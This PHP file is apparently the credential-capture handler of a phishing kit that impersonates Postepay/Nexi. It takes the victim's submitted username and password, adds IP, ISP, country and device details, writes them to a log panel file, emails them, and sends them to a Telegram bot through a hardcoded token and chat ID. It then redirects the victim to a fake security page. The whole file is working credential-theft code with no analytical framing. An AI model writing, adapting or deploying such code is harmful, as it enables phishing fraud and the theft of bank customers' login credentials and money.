<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['username']) and !empty($_POST['password'])) {
        $_SESSION['password'] = $_POST['password'];
        
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        include('GET.IP.INFOS.php');
        include('../../BOTS/STRNG.php');

        $date = date("d/m/Y");
        $date_format = ("D|M|Y");

        // تنسيق النصوص بحيث فقط "user" و "pass" هما المحاطين بـ backticks
        $ATR480X = "•••••••••• 👑 [ POSTEPAY.ATR480X ] 👑\n";
        $ATR480X .= "【 USER  】   :  `".$_POST['username']."` \n";
		$ATR480X .= "【 ♛•🦅•▄︻テ══━一💥•🦅•♛ 】\n";
        $ATR480X .= "【 PASS 】   :  `".$_POST['password']."` \n"; 
        $ATR480X .= "•••••••••• ℹ️ [ VICM.INFS ] ℹ️\n";
        $ATR480X .= "[ 🔎 - 🔌 ] *  =  $ip - $LOOKUP_ISP\n";
        $ATR480X .= "[ 🖥 ] *  =  $v_isp\n";
        $ATR480X .= "[ 🚩 ] *  =  $LOOKUP_COUNTRY - $LOOKUP_CNTRCODE\n";
        $ATR480X .= "[ 💻 - 🌐 ] *  =  $device_details\n";
        $ATR480X .= "[ 🔗 ] *  =  $url\n";
        $ATR480X .= "[ 📆 ] *  =  $date - $date_format\n";
        $ATR480X .= "•••••••••• 🇮🇹🇮🇹.[IT].🇮🇹🇮🇹\n";

        $file = fopen("../../PANEL/ATR480X.html", "a+");
        fwrite($file, $ATR480X);
        fclose($file);

        $to = "";
        $subject = "[ LOG.RECEIVED ]";
        $headers = "From: [ NEXI.ATR480X ]<atr480x@atr480x.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
        mail($to, $subject, $ATR480X, $headers);

        $token = "7883633314:AAGvKDeRKvgLWiOpEWkaDa8ZeZuP3AlFidI";
        
        // إرسال الرسالة باستخدام Markdown
        // التأكد من تنسيق URL بشكل صحيح
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1858722787&text=" . urlencode($ATR480X) . "&parse_mode=Markdown");

        header("Location: ../SISTEMA.DI.SICUREZZA/REDIRECT/EXAMPLE.php?client_id=$my_rand_strng");
    } else {
        header("Location: ?error=".md5($_GET['error']));
    }
}
?>